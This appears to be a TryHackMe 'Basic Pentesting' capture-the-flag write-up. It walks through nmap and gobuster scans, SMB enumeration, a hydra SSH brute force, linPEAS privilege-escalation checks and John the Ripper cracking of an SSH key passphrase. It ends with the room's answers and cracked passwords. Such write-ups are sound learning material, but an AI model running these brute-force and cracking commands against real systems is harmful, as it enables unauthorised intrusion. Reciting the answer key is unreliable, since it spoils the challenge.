# Basic Pentesting – TryHackMe

## 🎯 Project Overview
**Module:** Basic Pentesting  
**Focus areas:**
- Brute forcing
- Hash cracking
- Service enumeration
- Linux enumeration
- Privilege Escalation

**Main goal:** Learn as much as possible through practical exploitation.

---

## 🖥️ Target Information
- **IP Address:** `10.48.184.22`

---

## 🔍 Scanning & Enumeration

### Open Ports
| Port | Service | Version |
|-----:|---------|---------|
| 22   | SSH     | OpenSSH |
| 80   | HTTP    | Apache httpd 2.4.41 |
| 139  | SMB     | Samba 4 |
| 445  | SMB     | Samba 4 |
| 8000 | AJP13   | Apache |
| 8080 | HTTP    | Apache Tomcat 9.0.7 |

---

## 🧪 Initial Nmap Scan

```bash
mkdir nmap
nmap -sC -sV -oN nmap/initial 10.48.184.22
Port 80 was open, so the web application was inspected.

🌐 Web Enumeration
The website displayed a “Undergoing maintenance” message.
Inspecting the page source revealed a hint pointing to development notes.

Directory Bruteforce
bash
Copy code
gobuster dir \
-w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
-u http://10.48.184.22
Hidden Directory Found
/development

Files discovered:

dev.txt

j.txt

Information gathered:

Mentions of a private application

Samba usage

Two users referenced: J and K

🗂️ SMB Enumeration
Since ports 139 and 445 were open, SMB enumeration was performed.

bash
Copy code
/usr/share/enum4linux/enum4linux.pl -a 10.48.184.22 | tee enum4linux.log
Users Discovered
jan

kay

🔐 Brute Force Attack (SSH)
With a valid username, SSH brute-forcing was performed.

bash
Copy code
hydra -l jan -P /opt/wordlists/rockyou.txt ssh://10.48.184.22
Credentials Found
yaml
Copy code
jan : armando
🔑 Initial Access (SSH)
bash
Copy code
ssh jan@10.48.184.22
Successfully logged in as user jan.

🧭 Post-Exploitation Enumeration
Users present on the system:

jan

kay

ubuntu

Inside /home/kay, the file pass.bak was discovered, but access was denied.

To read it, privilege escalation was required.

🚀 Privilege Escalation with linPEAS
Tool Used
linPEAS
https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

Transfer linPEAS to Target
bash
Copy code
scp /opt/linPEAS/linpeas.sh jan@10.48.184.22:/dev/shm
chmod +x linpeas.sh
Run linPEAS
bash
Copy code
./linpeas.sh | tee linpeas.log
Key Findings
Multiple scripting languages available (Perl, Python)

Internal open ports

Samba guest access

Private SSH key for user kay found

🔓 SSH Key Exploitation
Prepare SSH Key
bash
Copy code
chmod 600 kay-id-rsa
Crack SSH Key Passphrase
bash
Copy code
/opt/JohnTheRipper/run/ssh2john.py kay-id-rsa > forjohn.txt
/opt/JohnTheRipper/run/john forjohn.txt --wordlist=/opt/rockyou.txt
Passphrase Found
nginx
Copy code
beeswax
🔑 Login as Kay
bash
Copy code
ssh -i kay-id-rsa kay@10.48.184.22
Passphrase:

nginx
Copy code
beeswax
Successfully logged in as kay.

🏁 Final Flag
Now having access to Kay’s home directory, the file pass.bak could be read.

Final Password
powershell
Copy code
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
❓ Questions & Answers
What is the name of the hidden directory on the web server?
development

What is the username obtained via brute-force?
jan

What is the password?
armando

What service was used to access the server?
SSH

What is the name of the other user found on the system?
kay

What is the final password obtained?
heresareallystrongpasswordthatfollowsthepasswordpolicy$$

🧠 Conclusion
This room demonstrated the importance of:

Proper enumeration

Weak credential protection

Insecure SSH key handling

Automated privilege escalation tools

The combination of Gobuster, enum4linux, Hydra, linPEAS, and John the Ripper led to full system compromise.
